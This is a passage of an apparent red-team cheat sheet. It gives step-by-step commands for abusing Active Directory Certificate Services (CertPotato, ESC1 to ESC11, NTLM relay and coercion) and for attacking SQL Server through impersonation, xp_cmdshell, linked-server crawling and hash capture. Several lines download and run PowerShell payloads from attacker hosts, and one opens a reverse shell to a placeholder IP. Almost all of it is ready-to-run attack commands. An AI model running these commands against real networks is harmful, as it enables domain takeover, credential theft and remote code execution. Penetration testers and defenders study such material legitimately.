Get-DomainGroupMember "Cert Publishers"

.\Certify.exe cas

certipy find -u '<USER>@<DOMAIN>' -p '<PASSWORD>' -dc-ip '<DC_IP>' -stdout
```

#### List all templates
```
.\Certify.exe find

certipy find -u '<USER>@<DOMAIN>' -p '<PASSWORD>' -dc-ip '<DC_IP>' -stdout
```

#### Enumerate vulnerable templates
- This checks also for `Object Control`, if you have multiple users then don't run `/vulnerable` but check manually!
 ```
.\Certify.exe find /vulnerable

certipy find -u '<USER>@<DOMAIN>' -p '<PASSWORD>' -dc-ip '<DC_IP>' -old-bloodhound
certipy find -u '<USER>@<DOMAIN>' -p '<PASSWORD>' -dc-ip '<DC_IP>' -vulnerable -stdout
```

### Local privesc CertPotato
- Requirements
	- ADCS configured & Machine template
	- Access to Virtual or network service account

### Windows
#### Get TGT on target machine
```
.\Rubeus.exe tgtdeleg /nowrap
```

#### Inject ticket
```
.\Rubeus ptt /ticket:<BASE64 TICKET>
```

#### Check for machine template
- Check for `pkiextendedkeyusage` set to `Client Authentication`
```
.\Certify.exe find
```

#### Request template using machine template
```
.\Certify.exe request /ca:<CA SERVER>\<CA NAME> /user:<COMPUTERACCOUNT>$ /domain:<FQDN DOMAIN> /template:<TEMPLATE NAME>
```

#### Convert Pem to PFX with openssl
- Save the private key and cert to `cert.pem`
```
openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx
```

#### Unpack the hash attack
```
.\Rubeus.exe asktgt /getcredentials /user:<COMPUTERACCOUNT>$ /certificate:<PATH TO PFX> /password:<PASSWORD OF PFX> /domain:<FQDN DOMAIN> /dc:<FQDN DC> /show
```

#### Perform S4USelf attack to gain TGS ticket
- Possible services: CIFS for directory browsing, HOST and RPCSS for WMI, HOST and HTTP for PowerShell Remoting/WINRM
- Impersonate any user except those in groups "Protected Users" or accounts with the "This account is sensitive and cannot be delegated" right.
- Make sure they are local admin on the target machine.
```
.\Rubeus.exe s4u /self /impersonateuser:<USER TO IMPERSONATE> /altservice:cifs/<FQDN COMPUTER> /dc:<FQDN DC> /user:<COMPUTERACCOUNT>$ /rc4:<NTLM> /ptt

.\Rubeus.exe s4u /self /impersonateuser:<USER TO IMPERSONATE> /altservice:http/<FQDN COMPUTER> /dc:<FQDN DC> /user:<COMPUTERACCOUNT>$ /rc4:<NTLM> /ptt
```

#### Check access
```
dir \\<TARGET FQDN>\c$
winrs -r:<TARGET FQDN> whoami
```

### Linux
#### Get TGT on target machine
```
.\Rubeus.exe tgtdeleg /nowrap
```

#### Linux Convert ticket & Use
```
echo "<BASE64>" | base64 -d > ticket.kirbi
python3 ticketConverter.py ticket.kirbi ticket.ccache
export KRB5CCNAME=<PATH TO ticket.ccache>
```

#### Retrieve NTLM hash using shadow credentials
```
certipy shadow auto -k -no-pass -dc-ip <DC IP> -account cb-webapp1 -target <FQDN DC> -debug
```

#### Retrieve SID of domain
```
rpcclient -U '%' <FQDN DOMAIN> -c 'lsaquery'
```

#### Request TGS ticket
- Possible services: CIFS for directory browsing, HOST and RPCSS for WMI, HOST and HTTP for PowerShell Remoting/WINRM, LDAP for dcsync
- Impersonate any user except those in groups "Protected Users" or accounts with the "This account is sensitive and cannot be delegated" right.
- Make sure they are local admin on the target machine.
```
python3 ticketer.py -nthash <NTLM HASH> -domain <FQDN DOMAIN> -domain-sid <DOMAIN SID> -spn cifs/<FQDN COMPUTER ACCOUNT> Administrator

export KRB5CCNAME=<PATH TO CCACHE>
```

#### Execute commands
```
python3 wmiexec.py -k -no-pass <FQDN COMPUTER ACCOUNT>
```

### Privilege Escalation
### ESC1 Request SAN of other user
- Requirements
	- Extended Key Usage: `Smart Card Logon` (`1.3.6.1.4.1.311.20.2.2`), `PKINIT authentication` (`1.3.6.1.5.2.3.4`) or `Client Authentication` (`1.3.6.1.5.5.7.3.2`) for AD Authentication.
	- Certificate-Name-Flag: `ENROLLEE_SUPPLIES_SUBJECT` attribute is enabled: allows the certificate requestor to specify any subjectAltName (SAN) to request a certificate as any user 
	- User with Enrollment Rights
- CBA patch breaks this attack if there is no match with the SID of the target user. Use `/sidextension` or `-extensionsid` to fix this.
### Windows
#### Get SID of user 
```
Get-DomainUser <SAMACCOUNTNAME> | Select-Object samaccountname, objectsid
```

#### Request cert and abuse SAN
```
.\Certify.exe request /ca:<FQDN CA>\<CA NAME> /template:<TEMPLATE NAME> /altname:<USER> /sidextension:<TARGET OBJECT SID> /domain:<FQDN>
```

#### Convert Pem to PFX with openssl
- Save the private key and cert to `cert.pem`
```
openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx
```

#### Request TGT
- Add `/getcredentials` to also retrieve the NTLM hash
```
.\Rubeus.exe asktgt /user:<USER> /certificate:<PATH TO cert.pfx> /password:<PASSWORD> /domain:<FQDN DOMAIN> /dc:<FQDN DC> /nowrap /ptt
```

#### Check access
```
dir \\<TARGET FQDN>\c$
winrs -r:<TARGET FQDN> whoami
```

### Linux
#### Get SID of user 
```
pywerview get-netuser -u <USER> -p <PASSWORD --username <USER> --domain <FQDN DOMAIN> --dc-ip <DC IP> --attributes "objectsid"
```

#### Request cert and abuse SAN
```
certipy req -u <USER>@<DOMAIN> -hashes <NTLM HASH> -dc-ip <DC IP> -target <FQDN CA> -ca <CA NAME> -template <TEMPLATE NAME> -upn <SAMACCOUNTNAME>@<FQDN DOMAIN> -extensionsid <OBJECTSID> -out 'esc1' -debug
```

#### Unpac the hash
```
certipy auth -pfx 'esc1.pfx'
```

#### Check access
```
cme smb <FQDN> -u <USER> -H <NTLM HASH>
```

### ESC2 Modifiable SAN
- Same as ESC1 only EKU is different. A certificate with no EKUs (SubCA certificate) can be abused for any purpose as well. It could also be used to sign new certificates.
- Requirements
	- Extended Key Usage: `Any Purpose` (`2.5.29.37.0`)
	- Certificate-Name-Flag: `ENROLLEE_SUPPLIES_SUBJECT` attribute is enabled: allows the certificate requestor to specify any subjectAltName (SAN) to request a certificate as any user 
	- User with Enrollment Rights

#### Abuse same as ESC1 for Windows/Linux
- [ESC1 Link](#ESC1 Request SAN of other user)

### ESC3 Agent certificate & Enroll on behalf of other user
- Requires two certficate templates
	- Template 1
		- Extended Key Usage: `Certificate Request Agent` (`1.3.6.1.4.1.311.20.2.1`)
		- User with Enrollment Rights
	- Template 2
		- Extended Key Usage: `Client Authentication` (`1.3.6.1.5.5.7.3.2`)
		- Authorized Signatures Required: `1`
		- Application Policies: `Certificate Request Agent` (Doesn't show in certipy, Auth sig 1 is good)
		- User with Enrollment Rights

### Windows
#### Request Enrollment Agent Certificate
- Template 1
```
.\Certify.exe request /ca:<FQDN CA>\<CA NAME> /template:<TEMPLATE NAME 1> /user:<USER TO ENROLL> /domain:<DOMAIN>
```

#### Convert Pem to PFX with openssl
- Save the private key and cert to `cert.pem`
```
openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx
```

#### Enroll agent on behalf of another user
- Template 2

```
.\Certify.exe request /ca:<FQDN CA>\<CA NAME> /template:<TEMPLATE NAME 2> /onbehalfof:<DOMAIN>\<USER> /enrollcert:<PATH TO cert.pfx> /enrollcertpw:<PASSWORD> /domain:<DOMAIN>
```

#### Convert Pem to PFX with openssl
- Save the private key and cert to `cert.pem`
```
openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx
```

#### Request TGT
- Add `/getcredentials` to also retrieve the NTLM hash
```
.\Rubeus.exe asktgt /user:<USER> /certificate:<PATH TO cert.pfx> /password:<PASSWORD> /domain:<FQDN DOMAIN> /dc:<FQDN DC> /nowrap /ptt
```

#### Check access
```
dir \\<TARGET FQDN>\c$
winrs -r:<TARGET FQDN> whoami
```

### Linux
#### Request Enrollment Agent Certificate
- Template 1
```
.\Certify.exe request /ca:<FQDN CA>\<CA NAME> /template:<TEMPLATE NAME> /user:<USER TO ENROLL> /domain:<DOMAIN>

certipy req -u <USER>@<DOMAIN> -hashes <NTLM HASH> -dc-ip <DC IP> -target <FQDN CA> -ca <CA NAME> -template <TEMPLATE NAME> -upn <SAMACCOUNTNAME>@<FQDN DOMAIN> -out 'esc3' -debug -EnrollmentAgent-certipy
```

#### Enroll agent on behalf of another user
- Template 2
- Use the original certipy without `/extensionsid`
```
certipy req -u <USER>@<DOMAIN> -hashes <NTLM HASH> -dc-ip <DC IP> -target <FQDN CA> -ca <CA NAME> -template <TEMPLATE NAME> --on-behalf-of <DOMAIN>\<USER> -pfx '<PATH TO esc3.pfx>' -out 'esc3_admin' -timeout 30 -debug
```

#### Unpac the hash
```
certipy auth -pfx 'esc1.pfx'
```

#### Check access
```
cme smb <FQDN> -u <USER> -H <NTLM HASH>
```

### ESC4 Template ACEs
- Abuse ACL's on the template and then abuse ESC1, ESC2 or ESC3
- Requirements
	- User with  `Object Control Permissions` ACL `Owner`, `FullControl`, `WriteOwner`, `WriteDacl` or `WriteProperty`

### Windows
#### Enumerate ACLs for users
```
.\Certify.exe pkiobjects
```

#### Enumerate templates and ACL's
- Shows `Object Control Permissions`
```
Certify.exe find /showAllPermissions
```

#### Enumerate ACLs specific template
- https://github.com/FuzzySecurity/StandIn
```
.\StandIn_v13_Net45.exe --ADCS --filter <TEMPLATE NAME>
```

### Configure ESC1 client authentication
#### Add ENROLEE_SUPPLIES_SUBJECT
```
.\StandIn_v13_Net45.exe --ADCS --filter <TEMPLATE NAME> --ess --add
```

#### Add Enrollment
```
.\StandIn_v13_Net45.exe --ADCS --filter <TEMPLATE NAME> --ntaccount "<DOMAIN>\<USERS>" --enroll --add
```

#### Add client authentication EKU
```
.\StandIn_v13_Net45.exe --ADCS --filter <TEMPLATE NAME> --clientauth --add
```

#### Abuse same as ESC1 for Windows/Linux
- [ESC1 Link](#ESC1-Request-SAN-of-other-user)

#### Cleanup
```
## Remove Enrollment rights for cb\certstore
C:\ADCS\Tools> C:\ADCS\Tools\StandIn\StandIn_v13_Net45.exe --adcs --filter <TEMPLATE NAME> --ntaccount <DOMAIN>\<USER> --enroll --remove

## Remove ENROLLEE_SUPPLIES_SUBJECT
C:\ADCS\Tools> C:\ADCS\Tools\StandIn\StandIn_v13_Net45.exe --adcs --filter <TEMPLATE NAME> --ess --remove
```

#### Configure SmartCardLogon and request certs
-  `/alter` module alters the target template with SmartCardLogon and requests a new certificate for an alternate name and restores the template
```
.\CertifyKit.exe request /ca:<FQDC CA>\<CA NAME> /template:<TEMPLATE NAME> /altname:<USER> /domain:<FQDN DOMAIN> /alter /sidextension:<TARGET OBJECT SID>
```

### Linux
#### Enumerate ACLs
```
certipy find -u <USER> -p <PASSWORD> -stdout
```

### Configure ESC1
- Possible to use https://github.com/fortalice/modifyCertTemplate for more controls
#### Save template
```
certipy template -u <USER>@<FQDN> -hashes <NTLM HASH> -template <TEMPLATE NAME> -save-old
```

#### Get domain user SID
```
pywerview get-netuser -u <USER> -p <PASSWORD --username <USER> --domain <FQDN DOMAIN> --dc-ip <DC IP> --attributes "objectsid"
```

#### Abuse ESC4
```
certipy req -u <USER> -hashes <NTLM HASH> -ca <CA NAME> -target <FQDN CA> -template <TEMPLATE NAME> -upn <USER>@<FQDN DOMAIN> -extensionsid <USER SID> -out 'esc4-certipy' -debug
```

#### Restore template
```
certipy template -u <USER> -hashes <NTLM HASH> -template <TEMPLATE NAME> -configuration '<JSON>.json'
```

### ESC5 Vulnerable PKI Object ACEs
- Such as AD CS computer object or Containers
	- Compromising the CA's server's computer object using RBCD or Shadow Credentials
	- ACLs misconfigured to a descendant AD object (Certificate template, Certificate Authorities container, the NTAuthCertificates subject)

#### RBCD or Shadow Credentials
- [RBCD](#Computer-object-takeover)
- [Shadow Credentials](#Permissions-on-a-ComputerObject)

### ESC7 Vulnerable CA ACL
- A low privilege user is granted the ManageCA (CA Administrator) and ManageCertificates (Certificate Manager) rights over the CA.
- Bypass CBA patch in full enforcement mode:
	- ESC 7.1 Abusing SubCA template to approve a failed request using ManageCertificates rights: https://www.tarlogic.com/blog/ad-cs-esc7-attack
	- ESC 7.2  Abusing CRL Distribution Points (CDPs) and using them to deploy SYSTEM webshells to CA servers respectively: https://www.tarlogic.com/blog/ad-cs-manageca-rce/

### ESC7.1 Failed request
- Requirements:
	- User with `Allow ManageCA and ManageCertificates`
	- `SubCA` template enabled (or enable it). Should be enabled by default but only Domain Admins or Enterprise Admins can enroll by default!

### Windows
#### Check CA for user with permissions
```
.\Certify.exe cas
```

#### Check if SubCA is enabled
```
.\Certify.exe find
```

#### Get SID of user 
```
Get-DomainUser <SAMACCOUNTNAME> | Select-Object samaccountname, objectsid
```

#### Create failed request
```
.\Certify.exe request /ca:<FQDN CA>\<CA NAME> /template:<TEMPLATE> /altname:<USER> /domain:<DOMAIN> /sidextension:<TARGET OBJECT SID>
```

#### Save private key
```
notepad esc7.pem
```

#### Approve failed certificate
- https://github.com/blackarrowsec/Certify
	- This fork of Certify requires RSAT ADDS tools installed.
- Requires `ManageCA` and `ManageCertificates` permissions
```
.\Certify-esc7.exe issue /ca:<FQDN CA>\<CA NAME> /id:<REQUEST ID>
```

#### Download approved request
```
.\Certify-esc7.exe download /ca:<FQDN CA>\<CA NAME> /id:<REQUEST ID>
```

#### Append certificate
```
notepad esc7.pem
```

#### Convert Pem to PFX with openssl
- Save the private key and cert to `cert.pem`
```
openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx
```

#### Request TGT
- Add `/getcredentials` to also retrieve the NTLM hash
```
.\Rubeus.exe asktgt /user:<USER> /certificate:<PATH TO cert.pfx> /password:<PASSWORD> /domain:<FQDN DOMAIN> /dc:<FQDN DC> /nowrap /ptt
```

#### Check access
```
dir \\<TARGET FQDN>\c$
winrs -r:<TARGET FQDN> whoami
```

#### Give ManageCertificates rights
- Only run if required
```
certipy req -u <USER>@<DOMAIN> -hashes <NTLM HASH> -dc-ip <DC IP> -target <FQDN CA> -ca <CA NAME> -template <TEMPLATE NAME> -add-officer <TARGET USER>
```

#### Enable SubCA template
- Only run if required
- Requires ManageCertificates rights
```
certipy req -u <USER>@<DOMAIN> -hashes <NTLM HASH> -dc-ip <DC IP> -target <FQDN CA> -enable-template 'SubCA'
```

### Linux
#### Get SID of user 
```
pywerview get-netuser -u <USER> -p <PASSWORD --username <USER> --domain <FQDN DOMAIN> --dc-ip <DC IP> --attributes "objectsid"
```

#### Request cert and abuse SAN
```
certipy req -u <USER>@<DOMAIN> -hashes <NTLM HASH> -dc-ip <DC IP> -target <FQDN CA> -ca <CA NAME> -template <TEMPLATE NAME> -upn <SAMACCOUNTNAME>@<FQDN DOMAIN> -extensionsid <OBJECTSID> -out 'esc7' -debug
```

#### Approve failed certificate
- Requires `ManageCA` and `ManageCertificates` permissions
```
certipy req -u <USER>@<DOMAIN> -hashes <NTLM HASH> -dc-ip <DC IP> -target <FQDN CA> -ca <CA NAME> -issue-request <REQUEST ID> -debug
```

#### Download approved request
```
certipy req -u <USER>@<DOMAIN> -hashes <NTLM HASH> -dc-ip <DC IP> -target <FQDN CA> -ca <CA NAME> -retrieve <REQUEST ID> -out 'esc7' -debug
```

#### Append files
```
vim esc7.crt
vim esc7.key
```

#### Convert Pem to PFX with openssl
- Save the private key and cert to `cert.pem`
```
openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx
```

#### Unpac the hash
```
certipy auth -pfx 'esc7.pfx'
```

#### Check access
```
cme smb <FQDN> -u <USER> -H <NTLM HASH>
```

### ESC8 NTLM Relay to AD CS HTTP(S) Endpoints
- Web enrollment interface (`http://<CA FQDN>/certsrv/certsnsh.asp`)
- Target Default Machine Template or Domain Controller Authentication

#### Enumerate HTTP Enrollment Endpoints
```
certipy find -u <USER>@<FQDN DOMAIN> -p <PASSWORD> -dc-ip <DC IP> -stdout
```

```
certutil -enrollmentServerURL -config <CA NAME>
```

#### Start NTLMRelay
```
python3 ntlmrelayx.py -t http://<FQDN CA>/certsrv/certfnsh.asp -smb2support --adcs --template <TEMPLATE NAME>
```

#### Force coerce
```
python3 Coercer.py coerce -l <KALI IP> -t <TARGET IP> -u <USER> -p <PASSWORD> -d <DOMAIN> -v --filter-method-name "EfsRpcDuplicateEncryptionInfoFile"
```

#### Request TGT
```
.\Rubeus.exe asktgt /user:<COMPUTER ACCOUNT>$ /domain:<FQDN DOMAIN> /dc:<FQDN DC> /outfile:esc8.kirbi /certificate:<BASE64 CERT>
```

#### Execute S4USelf
```
.\Rubeus.exe s4u /self /impersonateuser:<USER> /altservice:cifs/<FQDN COMPUTER> /dc:<FQDN DC> /user:<COMPUTER ACCOUNT>$ /ticket:esc8.kirbi /ptt
```

#### Check access
```
dir \\<TARGET FQDN>\c$
winrs -r:<TARGET FQDN> whoami
```

### ESC11 NTLM Relay to AD CS ICPR Endpoints
- Relay RPC interface which supports NTLM auth. ICertPassage Remote Protocol can be used to request certificates
- If the `IF_ENFORCEENCRYPTICERTREQUEST` flag is set relaying using RPC will not be possible. Flag by default on Windows server 2012 and higher!

#### Enumerate CES Enrollment Endpoints
- Check for `Enforce Encryption for Requests : Disabled` on the Certificate Authorities (Not the template!)
- Requires specific fork of certipy https://github.com/sploutchy/Certipy
```
certipy find -u <USER>@<FQDN DOMAIN> -p <PASSWORD> -dc-ip <DC IP> -stdout
```

#### Start NTLMRelay
- Requires specific fork of impacket https://github.com/sploutchy/impacket
```
python3 ntlmrelayx.py -t rpc://<FQDN CA> -smb2support --adcs --template DomainControllerAuthentication -rpc-mode ICPR -icpr-ca-name "<CA NAME>"
```

#### Force coerce
```
python3 Coercer.py coerce -l <KALI IP> -t <TARGET IP> -u <USER> -p <PASSWORD> -d <DOMAIN> -v --filter-method-name "EfsRpcDuplicateEncryptionInfoFile"
```

#### Request TGT
```
.\Rubeus.exe asktgt /user:<COMPUTER ACCOUNT>$ /domain:<FQDN DOMAIN> /dc:<FQDN DC> /outfile:esc11.kirbi /certificate:<BASE64 CERT>
```

#### Execute S4USelf
```
.\Rubeus.exe s4u /self /impersonateuser:<USER> /altservice:cifs/<FQDN COMPUTER> /dc:<FQDN DC> /user:<COMPUTER ACCOUNT>$ /ticket:esc8.kirbi /ptt
```

#### Check access
```
dir \\<TARGET FQDN>\c$
winrs -r:<TARGET FQDN> whoami
```

## SQL Server
- Could be possible cross domain or cross forest!
```
. .\PowerUpSQL.ps1
```
 
#### Find possible SQL admins or groups that have access to SQL
```
Get-DomainGroup | Where-Object -Property samaccountname -Match SQL
MATCH p=(u:User)-[:SQLAdmin]->(c:Computer) RETURN p
```
 
### Locating and accessing SQL Servers
#### Discovery of SQL instances (SPN scanning)
```
Get-SQLInstanceDomain
 
$data = Get-DomainComputer -Domain <DOMAIN> | Where-Object serviceprincipalname -Match MSSQL | Select-Object -ExpandProperty serviceprincipalname | Select-String MSSQL
$data = $data -replace 'MSSQLSvc/', ''
```

#### UDP Scan
```
Get-SQLInstanceScanUDP -Computername <COMPUTER LIST> 
```

#### Broadcast scan
```
Get-SQLInstanceBroadcast
```
 
#### Check Local Instance
```
Get-SQLInstanceLocal 
```

### Initial foothold
- Unauthenticated / Local user / Domain user --> SQL Login
#### Check for weak passwords or default credentials
- Might want to check for default applications with backend SQL Server express for default instances/credentials those applications use.
- Never got it to work as described in the blog: https://h4ms1k.github.io/Red_Team_MSSQL_Server/#
```
Get-SQLInstanceScanUDP | Invoke-SQLAuditWeakLoginPw -Verbose
spray weak credentials against the sa account
```
 
#### Check accessibility to SQL servers with current credentials
```
Get-SQLConnectionTestThreaded
Get-SQLInstanceDomain | Get-SQLConnectionTestThreaded –Verbose
```
 
#### Check accessibility with other user account
- Requires to be used within runas
```
Get-SQLInstanceDomain | Get-SQLConnectionTestThreaded –Verbose
```

### Connecting
#### PowerUpSQL
```
Get-SQLInstancedomain | <PREFERED CMDLET>
```

#### Mssqlclient.py
```
mssqlclient.py -windows-auth <DOMAIN>/<USER>@<IP> -debug
```

#### Heidisql
- https://www.heidisql.com/

### Initial Recon
#### Gather information
```
Get-SQLInstanceDomain | Get-SQLServerInfo -Verbose
```

#### Check if sysadmin query
```
SELECT IS_SRVROLEMEMBER('sysadmin')
```

#### Check for xp_cmdshell
```
SELECT * FROM sys.configurations WHERE name = 'xp_cmdshell';
```

### Privilege Escalation to sysadmin
#### Audit for issues
```
Invoke-SQLAudit -Verbose -Instance <SQL INSTANCE>
```
 
#### Try to excalate privileges
```
Invoke-SQLEscalatePriv
```
 
### SQL Server enumerate login
- Try weak passwords against the enumerated users!
#### Blind SQL Server login enum
```
SELECT name FROM sys.syslogins;
SELECT name FROM sys.server_principals;
 
SELECT SUSER_NAME(1)
SELECT SUSER_NAME(2)
SELECT SUSER_NAME(3)

Get-SQLFuzzServerLogin -Instance <COMPUTERNAME>\<INSTANCENAME>
```
 
#### Blind SQL Domain Account Enum.
```
-- Get the domain where SQL Server is.--
SELECT DEFAULT_DOMAIN() as mydomain
-- Full RID of Domain Admins group.--
SELECT SUSER_SID('<Identified_Domain>\Domain Admins')
-- grab the first 48 bytes of the full RID to get domain’s SID. Create a new RID (will be associated with a domain object) by appending a hex number value to the previous SID. --
SELECT SUSER_NAME(RID) –> Get the domain object name associated to the RID.

Get-SQLFuzzDomainAccount -Instance <COMPUTERNAME>\<INSTANCENAME>
```

#### Check for weak passwords or default credentials
- Enumerate all SQL Logins as least privilege user and test username as password.
```
Get-SQLInstanceDomain | Invoke-SQLAuditWeakLoginPw -Verbose
```
 
### Impersonation attack
#### Check if impersonation is possible PowerUpSQL
```
Invoke-SQLAuditPrivImpersonateLogin -Instance <SQL INSTANCE> -Verbose -Debug
```

#### Check if impersonation is possible
```
-- Find users that can be impersonated
SELECT distinct b.name
FROM sys.server_permissions a
INNER JOIN sys.server_principals b
ON a.grantor_principal_id = b.principal_id
WHERE a.permission_name = 'IMPERSONATE'
```

#### Impersonate a user 
- Might be possible to impersonate user a and then user b and then sa!
```
-- Verify you are still running as the normal user login
SELECT SYSTEM_USER
SELECT IS_SRVROLEMEMBER('sysadmin')
-- Impersonate the sa login
EXECUTE AS LOGIN = 'sa'
-- Verify you are now running as the sa login
SELECT SYSTEM_USER
SELECT IS_SRVROLEMEMBER('sysadmin')
```

#### Enable and run xp_cmdshell
```
-- Enable show options
EXEC sp_configure 'show advanced options', '1'
RECONFIGURE
GO
-- Enable xp_cmdshell
EXEC sp_configure 'xp_cmdshell', '1' 
RECONFIGURE
GO
-- Quickly check what the service account is via xp_cmdshell
EXEC master..xp_cmdshell 'whoami'
```
 
#### Impersonate exploit script
- https://raw.githubusercontent.com/nullbind/Powershellery/master/Stable-ish/MSSQL/Invoke-SqlServer-Escalate-ExecuteAs.psm1
```
Import-Module .\Invoke-SqlServer-Escalate-ExecuteAs.psm1
Invoke-SqlServer-Escalate-ExecuteAs -SqlServerInstance <INSTANCE> -SqlUser <USER> -SqlPass <PASSWORD>
```
 
#### Check for impersonation through link
```
Get-SQLServerLinkCrawl -Instance <INSTANCE> -Verbose -Query 'SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = ''IMPERSONATE'''
```
 
### Create Stored procedure as DB_Owner
- Prerequisites:
 - db_owner role
 - owner of the database high privileged user
 - Database set to thrustworthy (To enable xp_cmdshell)

#### Check the db_owner role PowerUpSQL
```
Invoke-SQLAuditPrivTrustworthy -Instance <SQL INSTANCE> -Verbose -Debug
```
 
#### Check the db_owner role
```
USE <DB>;
select rp.name as database_role, mp.name as database_user
from sys.database_role_members drm
join sys.database_principals rp on (drm.role_principal_id = rp.principal_id)
join sys.database_principals mp on (drm.member_principal_id = mp.principal_id)
```
 
#### Check the owner of the database
```
SELECT suser_sname(owner_sid), * FROM sys.databases
```
 
#### Create a stored procedure
```
USE <DB>;
CREATE PROCEDURE sp_elevate_me
WITH EXECUTE AS OWNER
AS
EXEC sp_addsrvrolemember '<USER TO MAKE SYSADMIN>','sysadmin'
```

#### Execute procedure
```
USE <DB>
EXEC sp_elevate_me
```
 
#### Verify user is sysadmin
```
SELECT is_srvrolemember('sysadmin')
```

#### Automatic execution of stored procedures
- Found and abused with PowerUpSQL
```
invoke-SQLAudit
invoke-SQLEscalatePriv -Verbose -Debug
```

#### DB_Owner exploit script
- https://raw.githubusercontent.com/nullbind/Powershellery/master/Stable-ish/MSSQL/Invoke-SqlServer-Escalate-Dbowner.psm1
```
Import-Module .\Invoke-SqlServerDbElevateDbOwner.psm1
Invoke-SqlServerDbElevateDbOwner -SqlUser <USER> -SqlPass <PASSWORD> -SqlServerInstance <INSTANCE>
```
 
### Command execution
![image](https://user-images.githubusercontent.com/43987245/151711534-6114738f-6c9c-49b2-8c5f-0cb27f5fa6d0.png)

#### Check xp_cmdshell
```
SELECT * FROM sys.configurations WHERE name = 'xp_cmdshell';
```
 
#### Enable and run xp_cmdshell
```
-- Enable show options
EXEC sp_configure 'show advanced options',1
RECONFIGURE
GO
-- Enable xp_cmdshell
EXEC sp_configure 'xp_cmdshell',1
RECONFIGURE
GO
-- Quickly check what the service account is via xp_cmdshell
EXEC master..xp_cmdshell 'whoami'
```
 
#### Execute commands trick
- Prevents having to deal with the escaped, qoutes, double qoutes etc
```
$str = 'IEX ((new-object net.webclient).downloadstring("http://x.x.x.x:8090/payload"))'
[System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($str)) | clip
EXEC xp_cmdshell 'powershell.exe -w hidden -enc <BASE64 STRING>';
```
 
#### Execute commands examples
```
Get-SQLServerLinkCrawl -Instance <SQL INSTANCE> -Query "exec master..xp_cmdshell 'whoami'"
Invoke-SQLOSCmd -Instance <SQL INSTANCE> -Verbose -Command "Whoami" -Threads 10
 
Invoke-SQLOSCLR -Instance <SQL INSTANCE> -Verbose -Command "Whoami" 
Invoke-SQLOSOLe -Instance <SQL INSTANCE> -Verbose -Command "Whoami" 
Invoke-SQLOSR -Instance <SQL INSTANCE> -Verbose -Command "Whoami" 
```

#### Execute command through links example
```
select * from openquery("192.168.23.25",'select * from openquery("db-sqlsrv",''select @@version as version;exec master..xp_cmdshell "powershell iex (New-Object Net.WebClient).DownloadString(''''http://192.168.100.X/Invoke-PowerShellTcp.ps1'''')"'')')
```

#### Execute reverse shell example
```
Get-SQLServerLinkCrawl -Instance <INSTANCE> -Query "exec master..xp_cmdshell 'Powershell.exe iex (iwr http://xx.xx.xx.xx/Invoke-PowerShellTcp.ps1 -UseBasicParsing);reverse -Reverse -IPAddress xx.xx.xx.xx -Port 4000'"
```
 
### Database links
#### Search for links to remote servers
- Check if `RPC_OUT` is enabled. If yes and link is configured with sysadmin we can enable xp_cmdshell.
```
Get-SQLServerLink -Instance <SQL INSTANCE> -Verbose
```

#### Crawl links to remote servers
```
Get-SQLServerLinkCrawl -Instance <SQL INSTANCE> -Verbose
```

#### Crawl links and show servers where we are sysadmin
```
Get-SQLServerLinkCrawl -Instance <SQL INSTANCE> | Where-Object -Property sysadmin -Match 1
```

#### Crawl and try to use xp_cmdshell on every link
```
Get-SQLServerLinkCrawl -Instance <SQL INSTANCE> -Query 'exec master..xp_cmdshell ''whoami'''
Get-SQLServerLinkCrawl -Instance <SQL INSTANCE> -Query 'exec master..xp_cmdshell ''whoami''' | Where-Object CustomQuery
```

### Manual queries
- https://book.hacktricks.xyz/windows/active-directory-methodology/mssql-trusted-links
- There is two methods ```openquery()``` and ```EXECUTE AT```.
- Some times you won't be able to perform actions like exec xp_cmdshell from ```openquery()``` in those cases it might be worth it to test ```EXCUTE AT```

#### Manually enumerate database links query
```
SELECT * FROM master..sysservers
```
 
#### Query a link - for example for more for links or information
```
SELECT * FROM OPENQUERY("<SERVER>\<DB>", 'SELECT * FROM master..sysservers;')
SELECT * FROM OPENQUERY("<SERVER>\<DB>", 'select @@servername');
SELECT * FROM OPENQUERY("<SERVER>\<DB>", 'SELECT * FROM sys.configurations WHERE name = ''xp_cmdshell''');
```
 
#### Example with double or tripple queries
```
SELECT * FROM OPENQUERY("sql-1.test.io", 'select @@servername; exec xp_cmdshell ''powershell -w hidden -enc blah''')
SELECT * FROM OPENQUERY("sql-1.test.io", 'select * from openquery("sql01.test.local", ''select @@servername; exec xp_cmdshell ''''powershell -enc blah'''''')')
```

#### EXECUTE AT Enable xp_cmdshell
- RPC out needs to be enabled - this isn't default!
```
EXEC('sp_configure ''show advanced options'', 1; reconfigure;') AT "<DB>"
EXEC('sp_configure ''xp_cmdshell'', 1; reconfigure;') AT "<DB>"
EXEC('exec master..xp_cmdshell ''whoami''') AT "<SERVER>\<DB>"
```
 
#### EXECUTE AT enable RPC Out
- Requires to be sysadmin on the SQL server, not sysadmin for the configured link!
- Enter Srvname from enumerating links
```
EXEC sp_serveroption
@server='<SERVER>\<DB>', @optname='rpc out', @optvalue='True'
```
 
### Privilege escalation Service Accounts
#### Shared service account
- If multiple SQL Servers share the same service account. Comprimising one server comprimises them all!
 
#### Check as what the server is running
```
Get-SQLInstanceDomain | Get-SQLServerInfo | Select-object Instance, ServiceAccount
```

#### UNC PATH INJECTION
- Public role has access to xp_dirtree and xp_fileexists to abuse UNC PATH INJECTION
- https://gist.github.com/nullbind/7dfca2a6309a4209b5aeef181b676c6e
 
#### Capture NetNTLM password hash
```
.\Inveigh.exe -DNS N -LLMNR N -LLMNRv6 N -HTTP N -FileOutput N
EXEC xp_dirtree '\\<IP>\pwn', 1, 1
```

```
sudo responder -I eth0
Get-SQLInstanceDomain | Invoke-SQLUncPathInjection
```
 
#### Capture NetNTLM password hash and relay it example
```
import-module .\PowerUpSQL.ps1
Import-Module \Scripts\3rdparty\Inveigh.ps1
